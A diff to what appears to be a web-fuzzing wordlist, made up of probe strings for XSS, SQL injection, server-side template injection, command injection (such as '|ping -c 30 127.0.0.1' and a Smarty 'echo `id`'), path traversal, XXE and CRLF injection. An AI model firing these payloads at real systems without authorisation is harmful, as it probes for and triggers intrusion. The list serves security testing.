@@ -1,46 +1,65 @@
-'
 "
-%27
-%2527
-&#x27;
-\x27
-\u0027
-'+OR+1=1--
-&bsol;
-SLEEP(1) /*’ or SLEEP(1) or’” or SLEEP(1) or “*/
-#
-{}
-%00
-http://
-../../
-|ping -c 30 127.0.0.1
-~'!@#$%^&?*:()[]|\-_+,./
-${{<%[%'"{{%\
-<s>Electric_Yellow
-"><img src=x onerror=alert(document.domain)>
-&#x3c;script&#x3e;&#x61;lert(document.domain)&#x3c;&#x2f;script&#x3e;
-{{8*8}}[[5*5]]${{7*7}}#{{3*7}}<%= 9*9 %>
-\"-alert(1)}//
+" tabindex=1 onfocus=alert(1) x="
 "-prompt(69)-"
-'-prompt(69)-'
-<img src=1 onerror=alert(1)>
+"><img src=x onerror=alert(document.domain)>
+"><img/src=ElectricYellow onerror=alert(1)>
 "><svg><animatetransform onbegin=alert(1)>
-<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"Electric_Yellow
-Electric",'|&$;:`({@<%=Yellow
-a'a\'b"c>?>%}}%%>c<[[?${{%}}Electric_Yellow\
-${{<%[%'"}}%\.,
-}}{{15668*2}}
-${15668*2}
-<%= 15668*2 %>
-${{15668*2}}
+#
 #{15668*2}
-{% debug %}
-{php}echo `id`;{/php}
-_cat
-/_cluster
-/_security
+${15668*2}
+${class.getResource("").getPath()}
+${{15668*2}}
+${{<%[%'"{{%\
+${{<%[%'"}}%\.,
+%00
 %00%00
+%0d%0a%0d%0aelectric: yellow
+%2527
+%27
 %ff%fe
 %ff%ff
+&#x27;
+&#x3c;script&#x3e;&#x61;lert(document.domain)&#x3c;&#x2f;script&#x3e;
+&&
+&bsol;
+'
+' OR 1=1-- -
+'+OR+1=1--
+'-prompt(69)-'
+../../
+../../../
+..\..\..\
+//
+/_cluster
+/_security
+<!DOCTYPE xxe [<!ENTITY foo "ElectricYellow">]><root>&foo;</root>
+<%= 15668*2 %>
+<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"Electric_Yellow
+<?xml version="1.0" encoding="utf-8?>
+<img src=1 onerror=alert(1)>
+<s>Electric_Yellow
+Electric",'|&$;:`({@<%=Yellow
+SLEEP(10) /*’ or SLEEP(10) or’” or SLEEP(10) or “*/
+[]
+\"-alert(1)}//
+\u0027
+\x27
 ^.*$
 ^_*$
+__init__.__globals__["{module}"].config
+_cat
+`
+a'a\'b"c>?>%}}%%>c<[[?${{%}}ElectricYellow\
+electricYellow()
+http://
+null
+undefined
+{% debug %}
+{php}echo `id`;{/php}
+{{8*8}}[[5*5]]${7*4}
+{{8*8}}[[5*5]]${{7*7}}#{{3*7}}<%= 9*9 %>
+{}
+|ping -c 30 127.0.0.1
+||
+}}{{15668*2}}
+~'!@#$%^&?*:()[]|\-_+,./
